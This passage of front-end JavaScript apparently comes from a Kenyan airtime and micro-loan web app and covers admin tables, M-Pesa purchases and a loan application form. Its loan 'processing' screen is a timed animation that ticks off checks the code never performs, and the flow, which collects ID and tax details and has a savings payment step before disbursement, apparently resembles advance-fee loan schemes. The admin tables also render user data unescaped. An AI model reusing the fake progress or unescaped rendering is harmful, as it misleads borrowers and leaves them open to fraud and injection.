                    <td>KES ${parseFloat(u.balance).toFixed(2)}</td>
                    <td>KES ${parseFloat(u.bonus_balance).toFixed(2)}</td>
                    <td><span class="status ${u.is_disabled ? 'status-failed' : 'status-completed'}">${u.is_disabled ? 'Disabled' : 'Active'}</span></td>
                    <td>${new Date(u.created_at).toLocaleDateString()}</td>
                    <td>
                        <button class="btn btn-outline" style="width: auto; padding: 5px 10px; font-size: 0.8rem;" onclick="toggleUserStatus('${u.id}')">${u.is_disabled ? 'Enable' : 'Disable'}</button>
                        <button class="btn btn-primary" style="width: auto; padding: 5px 10px; font-size: 0.8rem;" onclick="showAdjustBalance('${u.id}', '${u.email}')">Adjust</button>
                    </td>
                </tr>
            `).join('');
            const select = document.getElementById('notifRecipient');
            select.innerHTML = '<option value="">All Users</option>' + users.map(u => `<option value="${u.id}">${u.email}</option>`).join('');
        }

        function renderAdminTransactions(transactions) {
            const tbody = document.querySelector('#adminTxTable tbody');
            tbody.innerHTML = transactions.slice(0, 100).map(t => `
                <tr>
                    <td>${t.email || '-'}</td>
                    <td>${t.type}</td>
                    <td>KES ${t.amount}</td>
                    <td>${t.phone || '-'}</td>
                    <td><span class="status status-${t.status === 'completed' ? 'completed' : t.status === 'pending' ? 'pending' : 'failed'}">${t.status}</span></td>
                    <td>${new Date(t.created_at).toLocaleString()}</td>
                </tr>
            `).join('');
        }

        function renderAdminVerifications(verifications) {
            const tbody = document.querySelector('#verificationsTable tbody');
            tbody.innerHTML = verifications.map(v => `
                <tr>
                    <td>${v.email || '-'}</td>
                    <td>${v.mpesa_code}</td>
                    <td>KES ${v.amount_claimed || 0}</td>
                    <td><span class="status status-${v.status === 'validated' ? 'completed' : v.status === 'pending' ? 'pending' : 'failed'}">${v.status}</span></td>
                    <td>
                        ${v.status === 'pending' ? `
                            <button class="btn btn-primary" style="width: auto; padding: 5px 10px; font-size: 0.8rem;" onclick="approveVerification('${v.id}', ${v.amount_claimed || 0})">Approve</button>
                            <button class="btn btn-outline" style="width: auto; padding: 5px 10px; font-size: 0.8rem;" onclick="rejectVerification('${v.id}')">Reject</button>
                        ` : '-'}
                    </td>
                </tr>
            `).join('');
        }

        window.showAdminTab = function(tab) {
            document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
            document.querySelector(`.admin-tab[onclick*="${tab}"]`).classList.add('active');
            ['users', 'transactions', 'verifications', 'notifications', 'settings'].forEach(t => {
                document.getElementById(`adminTab${t.charAt(0).toUpperCase() + t.slice(1)}`).style.display = t === tab ? 'block' : 'none';
            });
        };

        window.toggleUserStatus = async function(userId) {
            try {
                await fetch(`${API_BASE}/api/admin/users/${userId}/toggle`, { method: 'PUT', credentials: 'include' });
                loadAdminData();
                showToast('User status updated', 'success');
            } catch (error) {
                showToast('Failed to update user', 'error');
            }
        };

        window.showAdjustBalance = function(userId, email) {
            const amount = prompt(`Enter amount to add/subtract for ${email}:`);
            if (amount === null) return;
            const type = parseFloat(amount) >= 0 ? 'add' : 'deduct';
            adjustBalance(userId, Math.abs(parseFloat(amount)), type);
        };

        async function adjustBalance(userId, amount, type) {
            try {
                await fetch(`${API_BASE}/api/admin/users/${userId}/balance`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ amount, type })
                });
                loadAdminData();
                showToast('Balance adjusted', 'success');
            } catch (error) {
                showToast('Failed to adjust balance', 'error');
            }
        }

        window.approveVerification = async function(id, amount) {
            const finalAmount = prompt('Enter amount to credit:', amount);
            if (finalAmount === null) return;
            try {
                await fetch(`${API_BASE}/api/admin/verifications/${id}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ status: 'validated', amount: parseFloat(finalAmount) })
                });
                loadAdminData();
                showToast('Verification approved', 'success');
            } catch (error) {
                showToast('Failed to approve', 'error');
            }
        };

        window.rejectVerification = async function(id) {
            try {
                await fetch(`${API_BASE}/api/admin/verifications/${id}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ status: 'rejected', amount: 0 })
                });
                loadAdminData();
                showToast('Verification rejected', 'success');
            } catch (error) {
                showToast('Failed to reject', 'error');
            }
        };

        window.updateFloatStatus = async function(isLow) {
            try {
                await fetch(`${API_BASE}/api/admin/float-status`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ isLow: isLow === 'true' })
                });
                showToast('Float status updated', 'success');
            } catch (error) {
                showToast('Failed to update', 'error');
            }
        };

        window.updateDepositStatus = async function(isDisabled) {
            try {
                await fetch(`${API_BASE}/api/admin/deposit-status`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ isDisabled: isDisabled === 'true' })
                });
                showToast('Deposit status updated', 'success');
            } catch (error) {
                showToast('Failed to update', 'error');
            }
        };

        document.getElementById('adminNotificationForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const userId = document.getElementById('notifRecipient').value || null;
            const title = document.getElementById('notifTitle').value;
            const message = document.getElementById('notifMessage').value;
            try {
                await fetch(`${API_BASE}/api/admin/notifications`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    credentials: 'include',
                    body: JSON.stringify({ userId, title, message })
                });
                showToast('Notification sent!', 'success');
                document.getElementById('adminNotificationForm').reset();
            } catch (error) {
                showToast('Failed to send notification', 'error');
            }
        });

        window.logoutAdmin = async function() {
            try {
                await fetch(`${API_BASE}/api/admin/logout`, { method: 'POST', credentials: 'include' });
            } catch (e) {}
            adminLoggedIn = false;
            if (adminRefreshInterval) clearInterval(adminRefreshInterval);
            document.getElementById('adminLogin').style.display = 'block';
            document.getElementById('adminDashboard').style.display = 'none';
            showToast('Admin logged out', 'info');
        };

        const savedTheme = localStorage.getItem('theme');
        if (savedTheme) {
            document.documentElement.setAttribute('data-theme', savedTheme);
            document.getElementById('themeSelect').value = savedTheme;
        }

        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            document.getElementById('pwaInstall').classList.add('show');
        });

        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('/service-worker.js')
                    .then((registration) => {
                        console.log('ServiceWorker registered:', registration.scope);
                    })
                    .catch((error) => {
                        console.log('ServiceWorker registration failed:', error);
                    });
            });
        }

        window.installPWA = async function() {
            if (!deferredPrompt) {
                showToast('Open in Chrome/Edge browser to install app, or add to home screen from browser menu', 'info');
                return;
            }
            deferredPrompt.prompt();
            const { outcome } = await deferredPrompt.userChoice;
            if (outcome === 'accepted') {
                showToast('App installed successfully!', 'success');
                document.getElementById('pwaInstall').style.display = 'none';
            }
            deferredPrompt = null;
        };

        // ===== DIRECT BUY AIRTIME FUNCTIONS =====
        let directBuyPollingInterval = null;
        let selectedDirectNetworkValue = '';

        window.scrollToDirectBuy = function() {
            showPage('dashboard');
            setTimeout(() => {
                const directBuySection = document.getElementById('directBuySection');
                if (directBuySection) {
                    directBuySection.scrollIntoView({ behavior: 'smooth', block: 'start' });
                    directBuySection.style.animation = 'pulse 0.5s ease-in-out 2';
                }
            }, 100);
        };

        window.validateDirectPhone = function() {
            const phone = document.getElementById('directBuyPhone').value;
            const error = document.getElementById('directPhoneError');
            const isValid = /^[71]\d{8}$/.test(phone);
            error.style.display = isValid || phone.length === 0 ? 'none' : 'block';
            updateDirectBuyButton();
            return isValid;
        };

        window.validateDirectPayPhone = function() {
            const phone = document.getElementById('directPayPhone').value;
            const error = document.getElementById('directPayPhoneError');
            const isValid = /^[71]\d{8}$/.test(phone);
            error.style.display = isValid || phone.length === 0 ? 'none' : 'block';
            updateDirectBuyButton();
            return isValid;
        };

        window.validateDirectAmount = function() {
            const amount = parseFloat(document.getElementById('directBuyAmount').value);
            const error = document.getElementById('directAmountError');
            const isValid = amount >= 10;
            error.style.display = isValid || isNaN(amount) ? 'none' : 'block';
            updateDirectBuyButton();
            return isValid;
        };

        window.selectDirectNetwork = function(network) {
            selectedDirectNetworkValue = network;
            document.getElementById('selectedDirectNetwork').value = network;
            document.getElementById('directNetworkError').style.display = 'none';
            
            document.querySelectorAll('#directNetworkSelector .network-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            document.querySelector(`#directNetworkSelector .network-option[data-network="${network}"]`).classList.add('selected');
            updateDirectBuyButton();
        };

        function updateDirectBuyButton() {
            const phone = document.getElementById('directBuyPhone').value;
            const payPhone = document.getElementById('directPayPhone').value;
            const amount = parseFloat(document.getElementById('directBuyAmount').value);
            const network = document.getElementById('selectedDirectNetwork').value;
            
            const phoneValid = /^[71]\d{8}$/.test(phone);
            const payPhoneValid = /^[71]\d{8}$/.test(payPhone);
            const amountValid = amount >= 10;
            const networkValid = network !== '';
            
            document.getElementById('directBuyBtn').disabled = !(phoneValid && payPhoneValid && amountValid && networkValid);
        }

        window.initiateDirectBuy = async function() {
            const phone = document.getElementById('directBuyPhone').value;
            const payPhone = document.getElementById('directPayPhone').value;
            const amount = parseFloat(document.getElementById('directBuyAmount').value);
            const network = document.getElementById('selectedDirectNetwork').value;
            
            if (!validateDirectPhone() || !validateDirectPayPhone() || !validateDirectAmount()) {
                showToast('Please fill all fields correctly', 'error');
                return;
            }
            
            if (!network) {
                document.getElementById('directNetworkError').style.display = 'block';
                showToast('Please select a network', 'error');
                return;
            }
            
            const btn = document.getElementById('directBuyBtn');
            const statusDiv = document.getElementById('directBuyStatus');
            const statusText = document.getElementById('directBuyStatusText');
            
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> Sending STK Push...';
            statusDiv.style.display = 'block';
            statusText.textContent = 'Initiating payment...';
            
            try {
                const response = await fetch(`${API_BASE}/api/airtime/direct`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        phone_to_receive: `254${phone}`,
                        phone_to_pay: `254${payPhone}`,
                        amount: amount,
                        network: network
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    showToast('STK Push sent! Enter your M-Pesa PIN', 'success');
                    statusText.textContent = 'Waiting for M-Pesa payment...';
                    pollDirectBuyStatus(data.reference, phone, amount, network);
                } else {
                    throw new Error(data.message || 'Failed to initiate purchase');
                }
            } catch (error) {
                console.error('Direct buy error:', error);
                showToast(error.message || 'Failed to initiate purchase', 'error');
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-bolt"></i> Buy Now via M-Pesa';
                statusDiv.style.display = 'none';
            }
        };

        function pollDirectBuyStatus(reference, phone, amount, network) {
            let attempts = 0;
            const maxAttempts = 60;
            const statusText = document.getElementById('directBuyStatusText');
            const btn = document.getElementById('directBuyBtn');
            const statusDiv = document.getElementById('directBuyStatus');
            
            if (directBuyPollingInterval) clearInterval(directBuyPollingInterval);
            
            directBuyPollingInterval = setInterval(async () => {
                attempts++;
                
                if (attempts > maxAttempts) {
                    clearInterval(directBuyPollingInterval);
                    statusDiv.style.display = 'none';
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-bolt"></i> Buy Now via M-Pesa';
                    showDirectBuyReceipt('timeout', phone, amount, network, reference, 'Payment timed out. Please try again.');
                    return;
                }
                
                try {
                    const response = await fetch(`${API_BASE}/api/airtime/direct/status/${reference}`);
                    const data = await response.json();
                    
                    if (data.status === 'completed') {
                        clearInterval(directBuyPollingInterval);
                        statusDiv.style.display = 'none';
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-bolt"></i> Buy Now via M-Pesa';
                        showDirectBuyReceipt('success', phone, amount, network, data.transaction_id || reference, 'Airtime sent successfully!');
                        saveDirectBuyHistory({ phone, amount, network, reference, status: 'completed', date: new Date().toISOString() });
                        document.getElementById('directBuyForm').reset();
                        selectedDirectNetworkValue = '';
                        document.querySelectorAll('#directNetworkSelector .network-option').forEach(opt => opt.classList.remove('selected'));
                    } else if (data.status === 'failed') {
                        clearInterval(directBuyPollingInterval);
                        statusDiv.style.display = 'none';
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-bolt"></i> Buy Now via M-Pesa';
                        showDirectBuyReceipt('failed', phone, amount, network, reference, data.message || 'Payment failed. Please try again.');
                    } else {
                        statusText.textContent = `Waiting for payment... (${attempts}s)`;
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 2000);
        }

        function showDirectBuyReceipt(status, phone, amount, network, txId, message) {
            const iconEl = document.getElementById('receiptIcon');
            const statusEl = document.getElementById('receiptStatus');
            
            if (status === 'success') {
                iconEl.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i>';
                statusEl.textContent = 'Transaction Successful!';
                statusEl.style.color = 'var(--success)';
            } else if (status === 'failed') {
                iconEl.innerHTML = '<i class="fas fa-times-circle" style="color: var(--danger);"></i>';
                statusEl.textContent = 'Transaction Failed';
                statusEl.style.color = 'var(--danger)';
            } else {
                iconEl.innerHTML = '<i class="fas fa-clock" style="color: var(--warning);"></i>';
                statusEl.textContent = 'Transaction Timed Out';
                statusEl.style.color = 'var(--warning)';
            }
            
            document.getElementById('receiptPhone').textContent = '+254' + phone;
            document.getElementById('receiptAmount').textContent = 'KES ' + amount;
            document.getElementById('receiptNetwork').textContent = network.charAt(0).toUpperCase() + network.slice(1);
            document.getElementById('receiptTxId').textContent = txId;
            document.getElementById('receiptDate').textContent = new Date().toLocaleString();
            document.getElementById('receiptMessage').textContent = message;
            
            document.getElementById('directBuyReceiptModal').classList.add('show');
        }

        function saveDirectBuyHistory(purchase) {
            try {
                const storageValue = localStorage.getItem('directBuyHistory');
                let history = [];
                if (storageValue) {
                    try {
                        history = JSON.parse(storageValue);
                    } catch (parseError) {
                        history = [];
                    }
                }
                if (!Array.isArray(history)) history = [];
                history.unshift(purchase);
                if (history.length > 20) history = history.slice(0, 20);
                localStorage.setItem('directBuyHistory', JSON.stringify(history));
            } catch (e) {
                console.error('Failed to save history:', e);
            }
        }

        window.goToDirectBuyFromBuyPage = function() {
            const phone = document.getElementById('airtimePhone').value;
            const amount = document.getElementById('airtimeAmount').value;
            const network = document.getElementById('selectedNetwork').value;
            
            scrollToDirectBuy();
            
            setTimeout(() => {
                if (phone) document.getElementById('directBuyPhone').value = phone;
                if (amount) document.getElementById('directBuyAmount').value = amount;
                if (network) selectDirectNetwork(network);
                validateDirectPhone();
                validateDirectAmount();
            }, 200);
        };

        // ===== LOAN SYSTEM FUNCTIONS =====
        let loanApplication = {};
        let selectedLoanOffer = null;
        let loanSavingsPollingInterval = null;

        const kenyaCountyTowns = {
            nairobi: ['Westlands', 'Kilimani', 'Karen', 'Kasarani', 'Eastleigh', 'Embakasi', 'Langata', 'Dagoretti', 'CBD', 'South B', 'South C', 'Roysambu', 'Ruaraka', 'Mathare', 'Kibera', 'Kawangware'],
            mombasa: ['Nyali', 'Likoni', 'Kisauni', 'Changamwe', 'Mtwapa', 'CBD', 'Bamburi', 'Shanzu', 'Port Reitz', 'Tudor'],
            kisumu: ['Milimani', 'Kondele', 'Nyalenda', 'Mamboleo', 'CBD', 'Migosi', 'Obunga', 'Kisumu East', 'Kisumu West'],
            nakuru: ['Milimani', 'Section 58', 'London', 'Shabab', 'Lanet', 'Naivasha', 'Gilgil', 'Molo', 'Subukia', 'Njoro'],
            eldoret: ['Elgon View', 'Langas', 'Huruma', 'Kapseret', 'CBD', 'Pioneer', 'Kimumu', 'Annex', 'Kipkaren'],
            kiambu: ['Thika', 'Ruiru', 'Juja', 'Kikuyu', 'Limuru', 'Gatundu', 'Githunguri', 'Kiambu Town', 'Karuri', 'Ruaka'],
            machakos: ['Athi River', 'Machakos Town', 'Kangundo', 'Matungulu', 'Syokimau', 'Mavoko', 'Kathiani'],
            kajiado: ['Ngong', 'Ongata Rongai', 'Kitengela', 'Kiserian', 'Kajiado Town', 'Loitokitok', 'Namanga'],
            nyeri: ['Nyeri Town', 'Karatina', 'Othaya', 'Mukurweini', 'Mathira', 'Naro Moru'],
            meru: ['Meru Town', 'Nkubu', 'Maua', 'Timau', 'Igembe', 'Tigania'],
            kakamega: ['Kakamega Town', 'Mumias', 'Butere', 'Malava', 'Lugari', 'Shinyalu'],
            kilifi: ['Kilifi Town', 'Malindi', 'Watamu', 'Mariakani', 'Mtwapa', 'Kaloleni'],
            bungoma: ['Bungoma Town', 'Webuye', 'Kimilili', 'Chwele', 'Sirisia'],
            turkana: ['Lodwar', 'Kakuma', 'Lokichogio', 'Turkwel'],
            nyandarua: ['Ol Kalou', 'Olkalou', 'Ndaragwa', 'Engineer', 'Nyahururu'],
            muranga: ['Murang\'a Town', 'Kenol', 'Maragua', 'Kangema', 'Kandara'],
            embu: ['Embu Town', 'Runyenjes', 'Siakago', 'Manyatta'],
            trans_nzoia: ['Kitale', 'Endebess', 'Kiminini', 'Saboti'],
            kericho: ['Kericho Town', 'Litein', 'Londiani', 'Kipkelion'],
            bomet: ['Bomet Town', 'Sotik', 'Longisa', 'Sigor'],
            kisii: ['Kisii Town', 'Keroka', 'Ogembo', 'Suneka', 'Nyamache'],
            narok: ['Narok Town', 'Kilgoris', 'Nairagie Enkare', 'Ololulunga'],
            migori: ['Migori Town', 'Isebania', 'Kehancha', 'Awendo', 'Rongo'],
            homabay: ['Homa Bay Town', 'Oyugis', 'Mbita', 'Kendu Bay', 'Ndhiwa'],
            siaya: ['Siaya Town', 'Bondo', 'Ugunja', 'Yala', 'Ukwala'],
            nandi: ['Kapsabet', 'Nandi Hills', 'Mosoriot', 'Aldai'],
            baringo: ['Kabarnet', 'Marigat', 'Eldama Ravine', 'Mogotio'],
            laikipia: ['Nanyuki', 'Nyahururu', 'Rumuruti', 'Doldol'],
            samburu: ['Maralal', 'Archer\'s Post', 'Baragoi', 'Wamba'],
            westpokot: ['Kapenguria', 'Makutano', 'Chepareria', 'Sigor'],
            kitui: ['Kitui Town', 'Mwingi', 'Mutomo', 'Mutitu'],
            makueni: ['Wote', 'Emali', 'Sultan Hamud', 'Mtito Andei', 'Makindu'],
            kwale: ['Kwale Town', 'Ukunda', 'Diani', 'Msambweni', 'Lunga Lunga'],
            taita_taveta: ['Voi', 'Taveta', 'Wundanyi', 'Mwatate'],
            tana_river: ['Hola', 'Garsen', 'Bura', 'Madogo'],
            lamu: ['Lamu Town', 'Mpeketoni', 'Witu', 'Faza'],
            garissa: ['Garissa Town', 'Dadaab', 'Balambala', 'Ijara'],
            wajir: ['Wajir Town', 'Habaswein', 'Buna', 'Eldas'],
            mandera: ['Mandera Town', 'Elwak', 'Rhamu', 'Banissa'],
            marsabit: ['Marsabit Town', 'Moyale', 'Laisamis', 'Loiyangalani'],
            isiolo: ['Isiolo Town', 'Merti', 'Garbatulla', 'Kula Mawe'],
            tharaka_nithi: ['Chuka', 'Chogoria', 'Marimanti', 'Tharaka'],
            kirinyaga: ['Kerugoya', 'Kutus', 'Wanguru', 'Sagana', 'Kagio'],
            vihiga: ['Mbale', 'Luanda', 'Chavakali', 'Hamisi'],
            busia: ['Busia Town', 'Malaba', 'Nambale', 'Port Victoria'],
            elgeyo_marakwet: ['Iten', 'Kapsowar', 'Chepkorio', 'Tambach'],
            nyamira: ['Nyamira Town', 'Keroka', 'Ekerenyo', 'Nyansiongo']
        };

        window.openLoanTerms = function() {
            const email = localStorage.getItem('userEmail');
            if (!email) {
                showToast('Please login to apply for a loan', 'error');
                document.getElementById('authModal').classList.add('show');
                return;
            }
            
            const existingApp = localStorage.getItem('loanApplication');
            if (existingApp) {
                const app = JSON.parse(existingApp);
                if (app.status && app.status !== 'started') {
                    showLoanResumePopup(app);
                    return;
                }
            }
            
            document.getElementById('loanTermsModal').classList.add('show');
            const acceptBtn = document.getElementById('acceptTermsBtn');
            acceptBtn.disabled = true;
            acceptBtn.style.opacity = '0.5';
        };

        function showLoanResumePopup(app) {
            const statusMap = {
                'started': 'Application Started',
                'offers_shown': 'Viewing Loan Offers',
                'offer_selected': 'Offer Selected - Review Pending',
                'approving': 'Processing Approval',
                'approved': 'Approved - Awaiting Disbursement',
                'savings_paid': 'Savings Paid - Processing',
                'disbursed': 'Loan Disbursed'
            };
            
            document.getElementById('resumeStatus').textContent = statusMap[app.status] || app.status || '-';
            document.getElementById('resumeName').textContent = app.fullName || '-';
            
            const offerRow = document.getElementById('resumeOfferRow');
            if (app.selectedOffer) {
                offerRow.style.display = 'flex';
                document.getElementById('resumeOffer').textContent = 'KES ' + app.selectedOffer.amount.toLocaleString();
            } else {
                offerRow.style.display = 'none';
            }
            
            document.getElementById('loanResumeModal').classList.add('show');
        }

        window.resumeLoanApplication = function() {
            closeModal('loanResumeModal');
            const existingApp = localStorage.getItem('loanApplication');
            if (existingApp) {
                const app = JSON.parse(existingApp);
                if (app.status === 'offers_shown') {
                    showPage('loan-offers');
                    populateLoanOfferDetails();
                } else if (app.status === 'offer_selected') {
                    showPage('loan-review');
                    populateReviewPage();
                } else if (app.status === 'approved' || app.status === 'savings_paid' || app.status === 'disbursed') {
                    showPage('loan-approved');
                    populateLoanApprovedPage();
                } else {
                    showPage('loan-eligibility');
                    const email = localStorage.getItem('userEmail');
                    prefillLoanEligibilityForm(email);
                }
            }
        };

        window.startNewLoanApplication = function() {
            closeModal('loanResumeModal');
            localStorage.removeItem('loanApplication');
            document.getElementById('loanTermsModal').classList.add('show');
            const acceptBtn = document.getElementById('acceptTermsBtn');
            acceptBtn.disabled = true;
            acceptBtn.style.opacity = '0.5';
        };

        function checkLoanApplicationOnDashboard() {
            const existingApp = localStorage.getItem('loanApplication');
            if (existingApp) {
                const app = JSON.parse(existingApp);
                if (app.status && app.status !== 'disbursed') {
                    showLoanResumePopup(app);
                }
            }
        }

        window.checkTermsScroll = function() {
            const content = document.getElementById('loanTermsContent');
            const acceptBtn = document.getElementById('acceptTermsBtn');
            if (content.scrollHeight - content.scrollTop <= content.clientHeight + 50) {
                acceptBtn.disabled = false;
                acceptBtn.style.opacity = '1';
            }
        };

        window.acceptLoanTerms = function() {
            closeModal('loanTermsModal');
            localStorage.setItem('loanTermsAccepted', 'true');
            showPage('loan-dashboard');
        };

        window.checkLoanApplicationStatus = function() {
            const email = localStorage.getItem('userEmail');
            if (!email) {
                showToast('Please login to apply for a loan', 'error');
                document.getElementById('authModal').classList.add('show');
                return;
            }
            
            const existingApp = localStorage.getItem('loanApplication');
            if (existingApp) {
                const app = JSON.parse(existingApp);
                if (app.status === 'offers_shown') {
                    showPage('loan-offers');
                    populateLoanOfferDetails();
                    return;
                }
                if (app.status === 'offer_selected') {
                    showPage('loan-review');
                    populateReviewPage();
                    return;
                }
                if (app.status === 'approved' || app.status === 'savings_paid' || app.status === 'disbursed') {
                    showPage('loan-approved');
                    populateLoanApprovedPage();
                    return;
                }
            }
            
            showPage('loan-eligibility');
            prefillLoanEligibilityForm(email);
        };
        
        function prefillLoanEligibilityForm(email) {
            document.getElementById('loanEmail').value = email;
            
            const savedPhone = localStorage.getItem('userPhone');
            if (savedPhone) {
                document.getElementById('loanPhone').value = savedPhone.replace('254', '');
            }
            
            const existingApp = localStorage.getItem('loanApplication');
            if (existingApp) {
                const app = JSON.parse(existingApp);
                if (app.fullName) document.getElementById('loanFullName').value = app.fullName;
                if (app.idNumber) document.getElementById('loanIdNumber').value = app.idNumber;
                if (app.dob) document.getElementById('loanDob').value = app.dob;
                if (app.gender) document.getElementById('loanGender').value = app.gender;
                if (app.maritalStatus) document.getElementById('loanMarital').value = app.maritalStatus;
                if (app.phone) document.getElementById('loanPhone').value = app.phone.replace('254', '');
                if (app.county) {
                    document.getElementById('loanCounty').value = app.county;
                    updateLoanTowns();
                }
                if (app.town) document.getElementById('loanTown').value = app.town;
                if (app.address) document.getElementById('loanAddress').value = app.address;
                if (app.emergency1) {
                    document.getElementById('emergency1Name').value = app.emergency1.name || '';
                    document.getElementById('emergency1Relationship').value = app.emergency1.relationship || '';
                    document.getElementById('emergency1Phone').value = (app.emergency1.phone || '').replace('254', '');
                }
                if (app.emergency2) {
                    document.getElementById('emergency2Name').value = app.emergency2.name || '';
                    document.getElementById('emergency2Relationship').value = app.emergency2.relationship || '';
                    document.getElementById('emergency2Phone').value = (app.emergency2.phone || '').replace('254', '');
                }
                if (app.employment) document.getElementById('loanEmployment').value = app.employment;
                if (app.income) document.getElementById('loanIncome').value = app.income;
                if (app.employer) document.getElementById('loanEmployer').value = app.employer;
                if (app.kraPin) document.getElementById('loanKraPin').value = app.kraPin;
                if (app.purpose) document.getElementById('loanPurpose').value = app.purpose;
            }
        }

        window.updateLoanTowns = function() {
            const county = document.getElementById('loanCounty').value;
            const townSelect = document.getElementById('loanTown');
            townSelect.innerHTML = '<option value="">Select Town (Optional)</option>';
            if (county && kenyaCountyTowns[county]) {
                kenyaCountyTowns[county].forEach(town => {
                    const option = document.createElement('option');
                    option.value = town.toLowerCase().replace(/\s+/g, '-');
                    option.textContent = town;
                    townSelect.appendChild(option);
                });
            }
        };

        window.validateLoanName = function(input) {
            const words = input.value.trim().split(/\s+/);
            const error = document.getElementById('loanNameError');
            if (words.length < 2 && input.value.length > 0) {
                error.style.display = 'block';
                input.style.borderColor = 'var(--danger)';
            } else {
                error.style.display = 'none';
                input.style.borderColor = 'var(--border)';
            }
        };

        window.validateLoanId = function(input) {
            input.value = input.value.replace(/\D/g, '');
            const error = document.getElementById('loanIdError');
            const len = input.value.length;
            if (len > 0 && (len < 8 || len > 9)) {
                error.style.display = 'block';
                input.style.borderColor = 'var(--danger)';
            } else {
                error.style.display = 'none';
                input.style.borderColor = 'var(--border)';
            }
        };

        window.validateLoanDob = function(input) {
            const dob = new Date(input.value);
            const today = new Date();
            const age = Math.floor((today - dob) / (365.25 * 24 * 60 * 60 * 1000));
            const error = document.getElementById('loanDobError');
            if (age < 18) {
                error.style.display = 'block';
                input.style.borderColor = 'var(--danger)';
            } else {
                error.style.display = 'none';
                input.style.borderColor = 'var(--border)';
            }
        };

        window.validateLoanPhone = function(input) {
            input.value = input.value.replace(/\D/g, '');
            const error = document.getElementById('loanPhoneError');
            const isValid = /^[71]\d{8}$/.test(input.value);
            if (input.value.length > 0 && !isValid) {
                error.style.display = 'block';
                input.style.borderColor = 'var(--danger)';
            } else {
                error.style.display = 'none';
                input.style.borderColor = 'var(--border)';
            }
        };

        window.validateReviewPhone = function(input) {
            input.value = input.value.replace(/\D/g, '');
            const error = document.getElementById('reviewPhoneError');
            const isValid = /^[70][71]\d{7}$/.test(input.value) || /^[71]\d{8}$/.test(input.value);
            if (input.value.length > 0 && !isValid) {
                error.style.display = 'block';
                input.style.borderColor = 'var(--danger)';
            } else {
                error.style.display = 'none';
                input.style.borderColor = 'var(--border)';
            }
        };

        document.getElementById('loanEligibilityForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const idLen = document.getElementById('loanIdNumber').value.length;
            if (idLen < 8 || idLen > 9) {
                showToast('National ID must be 8 or 9 digits', 'error');
                return;
            }
            
            const dob = new Date(document.getElementById('loanDob').value);
            const age = Math.floor((new Date() - dob) / (365.25 * 24 * 60 * 60 * 1000));
            if (age < 18) {
                showToast('You must be 18 years or older to apply', 'error');
                return;
            }
            
            const phone = document.getElementById('loanPhone').value;
            if (!/^[71]\d{8}$/.test(phone)) {
                showToast('Please enter a valid phone number', 'error');
                return;
            }
            
            loanApplication = {
                fullName: document.getElementById('loanFullName').value,
                idNumber: document.getElementById('loanIdNumber').value,
                dob: document.getElementById('loanDob').value,
                gender: document.getElementById('loanGender').value,
                maritalStatus: document.getElementById('loanMarital').value,
                phone: '254' + phone,
                county: document.getElementById('loanCounty').value,
                town: document.getElementById('loanTown').value,
                address: document.getElementById('loanAddress').value,
                email: document.getElementById('loanEmail').value,
                emergency1: {
                    name: document.getElementById('emergency1Name').value,
                    relationship: document.getElementById('emergency1Relationship').value,
                    phone: '254' + document.getElementById('emergency1Phone').value
                },
                emergency2: {
                    name: document.getElementById('emergency2Name').value,
                    relationship: document.getElementById('emergency2Relationship').value,
                    phone: '254' + document.getElementById('emergency2Phone').value
                },
                employment: document.getElementById('loanEmployment').value,
                income: document.getElementById('loanIncome').value,
                employer: document.getElementById('loanEmployer').value,
                kraPin: document.getElementById('loanKraPin').value,
                purpose: document.getElementById('loanPurpose').value,
                existingLoan: document.getElementById('loanExisting').value,
                status: 'processing',
                submittedAt: new Date().toISOString()
            };
            
            localStorage.setItem('loanApplication', JSON.stringify(loanApplication));
            
            if (window.editLoanReturnToReview) {
                window.editLoanReturnToReview = false;
                showPage('loan-review');
                populateReviewPage();
            } else {
                showPage('loan-processing');
                startLoanProcessingTimer();
            }
        });

        function startLoanProcessingTimer() {
            let seconds = 20;
            const timerEl = document.getElementById('loanProcessingTimer');
            const steps = document.querySelectorAll('#loanProcessingSteps .processing-step');
            
            const interval = setInterval(() => {
                seconds--;
                timerEl.textContent = seconds;
                
                if (seconds === 16) {
                    steps[0].querySelector('i').className = 'fas fa-check-circle';
                    steps[0].querySelector('i').style.color = 'var(--success)';
                    steps[0].style.background = 'rgba(39, 174, 96, 0.15)';
                    steps[1].querySelector('i').className = 'fas fa-check-circle';
                    steps[1].querySelector('i').style.color = 'var(--success)';
                    steps[1].style.background = 'rgba(39, 174, 96, 0.15)';
                    steps[2].querySelector('i').className = 'fas fa-spinner fa-spin';
                    steps[2].querySelector('i').style.color = 'var(--primary)';
                    steps[2].style.opacity = '1';
                }
                
                if (seconds === 10) {
                    steps[2].querySelector('i').className = 'fas fa-check-circle';
                    steps[2].querySelector('i').style.color = 'var(--success)';
                    steps[2].style.background = 'rgba(39, 174, 96, 0.15)';
                    steps[3].querySelector('i').className = 'fas fa-spinner fa-spin';
                    steps[3].querySelector('i').style.color = 'var(--primary)';
                    steps[3].style.opacity = '1';
                }
                
                if (seconds === 5) {
